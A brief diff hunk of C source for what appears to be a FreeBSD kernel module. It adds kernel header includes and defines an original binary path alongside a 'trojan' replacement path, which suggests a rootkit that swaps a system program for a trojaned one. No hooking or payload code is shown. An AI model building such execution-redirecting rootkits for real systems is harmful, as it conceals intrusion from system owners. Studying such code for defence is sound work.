@@ -8,10 +8,14 @@
 #include <sys/syscall.h>
 #include <sys/sysproto.h>
 #include <sys/malloc.h>
+#include <sys/linker.h>
+#include <sys/lock.h>
+#include <sys/mutex.h>
 #include <vm/vm.h>
 #include <vm/vm_page.h>
 #include <vm/vm_map.h>
 #include <dirent.h>
+
 #define ORIGINAL "/sbin/hello"
 #define TROJAN "/sbin/trojan_hello"
 #define T_NAME "trojan_hello"
